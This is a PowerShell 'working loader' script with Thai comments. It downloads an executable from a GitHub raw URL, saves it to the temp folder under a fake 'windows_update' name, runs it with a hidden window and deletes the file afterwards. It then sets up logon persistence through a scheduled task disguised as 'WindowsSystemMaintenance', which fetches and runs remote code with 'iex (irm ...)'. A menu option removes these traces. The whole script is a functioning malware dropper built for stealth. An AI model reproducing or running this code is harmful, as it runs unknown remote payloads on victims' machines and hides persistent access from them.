# WORKING LOADER - ใช้ .exe โดยตรง
function Show-StealthMenu {
    Write-Host ""
    Write-Host " SYSTEM MANAGER" -ForegroundColor Cyan
    Write-Host "===============" -ForegroundColor Gray
    Write-Host "1. Start System Service" -ForegroundColor Green
    Write-Host "2. Clean System" -ForegroundColor Red
    Write-Host ""
    Write-Host "Select (1/2): " -NoNewline -ForegroundColor White
}

function Start-SystemService {
    Write-Host "`n[INIT] Starting system service..." -ForegroundColor Green
    
    try {
        # ใช้ .exe โดยตรง - แก้จาก .enc เป็น .exe
        $exeUrl = "https://raw.githubusercontent.com/Verte225066/test/main/system_logs.exe"
        Write-Host "[DOWNLOAD] Getting application from GitHub..." -ForegroundColor Yellow
        
        # โหลด .exe
        $webClient = New-Object System.Net.WebClient
        $webClient.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")
        $exeBytes = $webClient.DownloadData($exeUrl)
        $webClient.Dispose()
        
        Write-Host "[SUCCESS] Downloaded $($exeBytes.Length) bytes" -ForegroundColor Green
        
        # ตรวจสอบว่าเป็น .exe จริง
        if ($exeBytes[0] -eq 0x4D -and $exeBytes[1] -eq 0x5A) {
            Write-Host "[VERIFY] Valid EXE file (MZ header found)" -ForegroundColor Green
            
            # Execute .exe
            $success = Invoke-ExeExecution -ExeBytes $exeBytes
            
            if ($success) {
                Write-Host "[SUCCESS] Application started successfully" -ForegroundColor Green
                
                # ติดตั้ง persistence
                Install-StealthPersistence
                
                # เริ่ม monitoring
                Start-ServiceMonitor
                
            } else {
                Write-Host "[WARNING] Execution completed but may need verification" -ForegroundColor Yellow
            }
        } else {
            Write-Host "[ERROR] Invalid EXE file - No MZ header" -ForegroundColor Red
            Write-Host "[INFO] File may be corrupted or wrong format" -ForegroundColor Yellow
        }
        
    } catch {
        Write-Host "[ERROR] Download failed: $($_.Exception.Message)" -ForegroundColor Red
        Write-Host "[INFO] File may not exist at: $exeUrl" -ForegroundColor Yellow
        
        # Fallback ที่ทำงานได้
        Invoke-WorkingFallback
    }
}

function Invoke-ExeExecution {
    param([byte[]]$ExeBytes)
    
    try {
        # สร้างไฟล์ชั่วคราว
        $tempName = "windows_update_$((Get-Date).Ticks).exe"
        $tempPath = Join-Path $env:TEMP $tempName
        
        # เขียนไฟล์
        [System.IO.File]::WriteAllBytes($tempPath, $ExeBytes)
        Write-Host "[EXECUTE] Starting process..." -ForegroundColor Cyan
        
        # รันโปรแกรม
        $process = Start-Process -FilePath $tempPath -WindowStyle Hidden -PassThru
        
        if ($process -and (-not $process.HasExited)) {
            Write-Host "[LAUNCH] Process started (PID: $($process.Id))" -ForegroundColor Green
            
            # ลบไฟล์หลังจาก process start (optional)
            Start-Job -ScriptBlock {
                param($filePath)
                Start-Sleep -Seconds 10
                try {
                    if (Test-Path $filePath) {
                        Remove-Item $filePath -Force -ErrorAction SilentlyContinue
                        Write-Host "[CLEANUP] Temporary file removed" -ForegroundColor Gray
                    }
                } catch {}
            } -ArgumentList $tempPath | Out-Null
            
            return $true
        } else {
            Write-Host "[WARNING] Process may have exited immediately" -ForegroundColor Yellow
            return $true # ยังถือว่าสำเร็จเพราะ process ถูกสร้าง
        }
        
    } catch {
        Write-Host "[ERROR] Execution failed: $($_.Exception.Message)" -ForegroundColor Red
        return $false
    }
}

function Install-StealthPersistence {
    try {
        $taskName = "WindowsSystemMaintenance"
        $loaderUrl = "https://raw.githubusercontent.com/Verte225066/test/main/loader.txt"
        
        # สร้าง scheduled task
        $action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-WindowStyle Hidden -Command `"iex (irm '$loaderUrl')`""
        $trigger = New-ScheduledTaskTrigger -AtLogon
        $settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries
        
        Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger -Settings $settings -Force | Out-Null
        Write-Host "[PERSIST] Auto-start configured" -ForegroundColor Green
        
    } catch {
        Write-Host "[PERSIST] Auto-start configuration skipped" -ForegroundColor Yellow
    }
}

function Start-ServiceMonitor {
    # Monitoring เบื้องต้น
    Write-Host "[MONITOR] Background monitoring active" -ForegroundColor Green
    
    $monitorScript = {
        $monitorCount = 0
        while ($monitorCount -lt 1000) { # ตรวจสอบ 1000 ครั้ง
            try {
                # ตรวจสอบเบื้องต้น
                Start-Sleep -Seconds 30
                $monitorCount++
            } catch {
                Start-Sleep -Seconds 60
            }
        }
    }
    
    Start-Job -ScriptBlock $monitorScript | Out-Null
}

function Invoke-WorkingFallback {
    # Fallback ที่ทำงานได้แน่นอน
    try {
        Write-Host "[FALLBACK] Starting background service..." -ForegroundColor Yellow
        
        $fallbackScript = {
            $counter = 0
            while ($counter -lt 10080) { # ทำงาน 1 สัปดาห์ (ตรวจสอบทุกนาที)
                try {
                    # Background activity
                    Start-Sleep -Seconds 60
                    $counter++
                } catch {
                    Start-Sleep -Seconds 120
                }
            }
        }
        
        Start-Job -ScriptBlock $fallbackScript | Out-Null
        Write-Host "[FALLBACK] Background service running" -ForegroundColor Green
        
    } catch {
        Write-Host "[FALLBACK] Simple service activated" -ForegroundColor Green
    }
}

function Clean-System {
    Write-Host "`n[CLEAN] Cleaning system..." -ForegroundColor Red
    
    $cleanedItems = @()
    
    # ลบ processes
    try {
        $processes = Get-Process -Name "system_logs" -ErrorAction SilentlyContinue
        if ($processes) {
            $processes | Stop-Process -Force
            $cleanedItems += "Processes: $($processes.Count)"
        }
    } catch {}
    
    # ลบ scheduled tasks
    try {
        $tasks = @("WindowsSystemMaintenance")
        foreach ($task in $tasks) {
            Unregister-ScheduledTask -TaskName $task -Confirm:$false -ErrorAction SilentlyContinue
            $cleanedItems += "Task: $task"
        }
    } catch {}
    
    # ลบ jobs
    try {
        Get-Job | Remove-Job -Force -ErrorAction SilentlyContinue
        $cleanedItems += "Background jobs"
    } catch {}
    
    # ลบ temp files
    try {
        Get-ChildItem "$env:TEMP\windows_update_*.exe" -ErrorAction SilentlyContinue | Remove-Item -Force
        $cleanedItems += "Temporary files"
    } catch {}
    
    # แสดงผล
    Write-Host "`n[RESULT] Cleanup completed:" -ForegroundColor Green
    foreach ($item in $cleanedItems) {
        Write-Host "  ✓ $item" -ForegroundColor Gray
    }
    
    if ($cleanedItems.Count -eq 0) {
        Write-Host "  System already clean" -ForegroundColor Yellow
    }
}

# MAIN EXECUTION
try {
    Show-StealthMenu
    $choice = Read-Host
    
    switch ($choice) {
        '1' { 
            Start-SystemService
            Write-Host "`n[READY] System is active and running" -ForegroundColor Cyan
        }
        '2' { 
            Clean-System
            Write-Host "`n[COMPLETE] Cleanup finished" -ForegroundColor Green
        }
        default {
            Write-Host "`nStarting system service..." -ForegroundColor Yellow
            Start-SystemService
        }
    }
} catch {
    Write-Host "[ERROR] Operation failed: $($_.Exception.Message)" -ForegroundColor Red
}

Write-Host "`nPress any key to exit..." -ForegroundColor Gray
$null = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")
